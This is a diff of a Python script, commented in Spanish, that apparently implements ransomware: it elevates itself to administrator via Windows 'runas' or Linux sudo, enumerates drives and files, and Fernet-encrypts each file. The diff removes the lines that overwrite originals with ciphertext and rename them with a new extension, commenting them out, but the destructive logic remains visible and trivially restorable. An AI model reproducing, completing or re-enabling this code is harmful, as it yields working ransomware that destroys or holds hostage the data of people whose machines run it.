@@ -3,22 +3,46 @@ import os
 import psutil
 import sys
 import ctypes
-
-
-
+import os
+import sys
+import platform
+import ctypes
 
 
 
 def run_as_admin():
     try:
-        # Solicita permisos de administrador
-        ans = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-        return ans
+        system_name = platform.system()
         
+        if system_name == "Windows":
+            # Verifica si ya tiene permisos de administrador en Windows
+            if ctypes.windll.shell32.IsUserAnAdmin():
+                print("El script ya tiene permisos de administrador en Windows.")
+                return False
+            
+            # Solicita permisos de administrador
+            print("Solicitando permisos de administrador en Windows...")
+            args = " ".join(sys.argv)
+            return ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, args, None, 1) == 42
+
+        elif system_name == "Linux":
+            # Verifica si ya tiene permisos de administrador en Linux
+            if os.geteuid() == 0:
+                print("El script ya tiene permisos de administrador en Linux.")
+                return False
+            
+            # Solicita permisos de administrador
+            print("Solicitando permisos de administrador en Linux...")
+            command = ["sudo", sys.executable] + sys.argv
+            os.execvp("sudo", command)
+        
+        else:
+            print(f"El sistema operativo '{system_name}' no está soportado.")
+            return False
+
     except Exception as e:
         print(f"Error al solicitar permisos de administrador: {e}")
         return False
-
 
 
 
@@ -43,13 +67,10 @@ def encrypt(item, key):
     f = Fernet(key)
     with open(item, 'rb') as file:
         file_data = file.read()
-    print("file Encrypted:", item)
     encrypted_data = f.encrypt(file_data)
-    with open(item, 'wb') as file:
-        file.write(encrypted_data)
-    os.rename(item, item + '.' + extension)
-
-
+    # with open(item, 'wb') as file:
+        # file.write(encrypted_data)
+    # os.rename(item, item + '.' + extension)
 
 def find_drives():
     L = set()
@@ -69,13 +90,10 @@ def listar_files_in_dirs(rute):
 
 
 if __name__ == '__main__':
-    if ctypes.windll.shell32.IsUserAnAdmin():
-        pass
-    else:
-        print("Este programa requiere permisos de administrador. Solicitando elevación...")
-        if run_as_admin() == 42:
-            print("Permisos de administrador concedidos.")
-            sys.exit()
+
+    if run_as_admin():
+        print("Permisos de administrador concedidos.")
+        sys.exit()
     try:
 
         # Generación la clave de cifrado y se almacena en una variable.
